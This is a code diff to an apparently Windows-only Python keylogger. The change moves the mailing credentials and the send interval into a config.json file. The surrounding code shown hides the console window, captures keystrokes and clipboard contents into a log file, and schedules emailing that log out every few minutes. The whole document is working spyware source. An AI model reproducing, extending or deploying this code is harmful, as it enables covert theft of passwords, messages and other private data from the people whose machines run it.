@@ -5,6 +5,7 @@ import datetime
 import schedule
 import time
 import os
+import json
 
 # libs
 kernel32 = ctypes.windll.kernel32
@@ -13,10 +14,13 @@ user32 = ctypes.windll.user32
 # Hide window
 user32.ShowWindow(kernel32.GetConsoleWindow(), 0)
 
-# Mailing function
-EMAIL = 'yourmail@domain.com' # Enter your email id
-PASSWORD = 'yourmailpassword' # Your email id's password here
+# Load config to get essential info
+config = json.load(open('config.json', 'r'))
 
+EMAIL = config['EMAIL'] # Enter your email id
+PASSWORD = config['PASSWORD'] # Your email id's password here
+
+# Mailing function
 def sendMail():
     log_dir = os.environ['localappdata']
     log_name = 'applog.txt'
@@ -73,7 +77,8 @@ def get_clipboard():
         CloseClipboard() # Close the clipboard
 
 def get_keystrokes(log_dir, log_name): # Function to monitor and log keystrokes
-    schedule.every(2).minutes.do(sendMail) # You can change from 2 minutes to your desired minute for mailing.
+    global config
+    schedule.every(config['MAIL_EVERY']).minutes.do(sendMail) # You can change from 2 minutes to your desired minute for mailing.
     # Delete logger before starting
     if os.path.exists(log_dir +"\\"+ log_name):
         os.remove(log_dir +"\\"+ log_name)
